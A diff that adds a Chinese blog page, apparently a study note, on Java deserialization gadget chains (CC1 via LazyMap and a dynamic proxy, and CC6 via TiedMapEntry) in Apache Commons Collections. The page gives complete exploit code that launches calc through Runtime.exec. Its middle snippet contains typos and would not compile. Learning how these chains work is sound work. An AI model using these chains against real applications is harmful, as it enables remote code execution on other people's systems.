@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>java反序列化Commons-Collection篇02-CC6链 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">java反序列化Commons-Collection篇02-CC6链</h1>
+    <div class="post-meta">
+      <time datetime="2025-02-28">2025-02-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18743087">https://www.cnblogs.com/Zephyr07/articles/18743087</a></p>
+</blockquote>
+<h2 id="前情提要："><a href="#前情提要：" class="headerlink" title="前情提要："></a>前情提要：</h2><p>文章学习来自b站白日梦组长视频讲解，如有错误，请各位大佬提出orz！！！</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>pom.xml</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250303112300153-1964880834.png"></p>
+<h2 id="cc1补充："><a href="#cc1补充：" class="headerlink" title="cc1补充："></a>cc1补充：</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250301204538531-2105571423.png"></p>
+<p>继承cc1，只不过用的不是transformerMap方法了，用的是LazyMap中一个get方法，它同样也调用了transformer方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228133820427-1269189244.png"></p>
+<p>接下来就是找谁调用了get方法，然后在AnnotationInvocationHandler类中的有一个参数memberValues是可以控制的，就是我们传入的map</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228133832486-2131140969.png"></p>
+<p>然后发现在AnnotationInvocationHandler类中的invoke方法中memberValues调用了get方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228133838611-1596574901.png"></p>
+<p>然后动态代理的调用处理器类就是AnnotationInvocationHandler，然后其中的invoke是只要一个代理的任意方法调用就会执行这个invoke方法<br>所以就必须要生成一个动态代理，然后这个动态代理带调用的是AnnotationInvocationHandler这个调用处理器类<br>然后这个代理是需要实现一个接口的，所以这时候我们需要找一个接受那个接口的东西，然后这里面找到的还是AnnotationInvocationHandler，因为他可以接受map，所以只需要让动态代理实现这个map就好了<br>前面说了invoke是只要调用任意方法就可以执行，但是需要执行到我们的memberValues.get这里就需要通过前面的两个if</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250301204826099-355224091.png"></p>
+<ul>
+<li>第一个if是说如果调用equals方法，就会return，所以不能用equals方法</li>
+<li>第二个if是说如果你调用的是一个有参方法，就会抛出异常，所以也不能用有参方法</li>
+</ul>
+<p>这时候刚好前面发现的那个memberValues.entrySet()方法就是一个无参方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import org.springframework.core.env.Profiles;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc1_memory &#123;</span><br><span class="line">    public static void main(String[] args)throws Exception&#123;</span><br><span class="line">        Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object.class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">//        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();</span><br><span class="line">//        map.put(&quot;value&quot;,&quot;111&quot;);</span><br><span class="line">//        Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class="line">//</span><br><span class="line">//        Class c =Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">//        Constructor annotationInvocationHandlerConstructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">//        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class="line">//        Object o=annotationInvocationHandlerConstructor.newInstance();</span><br><span class="line">//        serialize(o);</span><br><span class="line">//        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c =Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationHandlerConstructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class="line">        InvocationHandler h=(InvocationHandler)annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        Object o=annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line">        //serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj)throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String Filename)throws IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h3><p>这个方法的话对jdk的版本要求比较高，需要在jdk1.8.0.65 之前才可以</p>
+<h3 id="区别是："><a href="#区别是：" class="headerlink" title="区别是："></a>区别是：</h3><p>jdk1.8.0.65之后对AnnotationInvocationHandler做了一些处理，就是AnnotationInvocationHandler里的readobject代码里的membervalue参数不可控了</p>
+<h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250301205913191-99493738.png"></p>
+<p>不受限于jdk的版本，要求低一些<br>这里是对改进之后的cc1做了一个处理<br>这里是找到了TiedMapEntry类里面的hashcode方法，里面使用getvalue方法，而getvalue方法又调用了map.get，这样就和上面的get连在一起了，到时候就可以改成lazymap.get</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250301205236071-502103103.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228134032093-890819745.png"></p>
+<p>然后hashmap.readobject中的hash是对key进行put，然后走到hashcode<br><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228134037246-851141807.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228134040998-911981472.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">  new ConstantTransformer(Runtime.class),</span><br><span class="line">  new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;)</span><br><span class="line">  new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;)</span><br><span class="line">  new InvokrTransformer(&quot;exec&quot;,new Class[]&#123;String.calss&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;</span><br><span class="line">ChainedTransformer chainedTransformer=new ChainedTransformer(transformers)</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt;map=new HashMap&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt;lazyMap=LazyMap.decorate(map,new ConstantTransformer(1))</span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map2=new HashMap&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry,&quot;bbb&quot;);</span><br><span class="line">lazyMap.remove(&quot;aaa&quot;;)</span><br><span class="line"></span><br><span class="line">Class c=LazyMap.class;</span><br><span class="line">Filed factoryFiled=c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">factoryFiled.setAccessible(true);</span><br><span class="line">factoryFiled.set(lazyMap,chainedTransformer)</span><br></pre></td></tr></table></figure>
+
+<h3 id="这里解释两个问题，"><a href="#这里解释两个问题，" class="headerlink" title="这里解释两个问题，"></a>这里解释两个问题，</h3><h4 id="第一个-就是为什么要反射获取lazymap类："><a href="#第一个-就是为什么要反射获取lazymap类：" class="headerlink" title="第一个:就是为什么要反射获取lazymap类："></a>第一个:就是为什么要反射获取lazymap类：</h4><p>原因是map2.put就会调用hash进而调用hashcode然后直接把这条链走完，所以我们需要把链子后面断掉，这里反射修改的就是lazymap的factory方法，把传参的key变成一个没用的东西，这样链子就中断了，</p>
+<h4 id="第二个是为什么要在put之后把key删掉？"><a href="#第二个是为什么要在put之后把key删掉？" class="headerlink" title="第二个是为什么要在put之后把key删掉？"></a>第二个是为什么要在put之后把key删掉？</h4><p>这是因为如果不删的话，链子到lazymap的get方法这里会给key放回去，这样就导致反序列化时候就已经有key了，这样就导致反序列化的时候当执行的lazymap.get方法的时候，就会导致过不了那个if(如下图)，从而导致不会执行transformer方法，所以反序列化就不能执行</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250301210512868-335706960.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="cc6完整exp"><a href="#cc6完整exp" class="headerlink" title="cc6完整exp"></a>cc6完整exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args)throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,&quot;bbbb&quot;);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Class c=LazyMap.class;</span><br><span class="line">        Field factoryField=c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        //serialize(map2);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj)throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String Filename)throws IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/02/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collection%E7%AF%8703-CC3%E9%93%BE/" class="prev">← java反序列化Commons-Collection篇03-CC3链</a>
+    
+    
+      <a href="/2025/02/28/%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%AE%9E%E6%88%98%E7%AF%87-%E8%BF%90%E7%BB%B4%E6%9D%B0%E5%85%8B/" class="next">第九章-实战篇-运维杰克 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
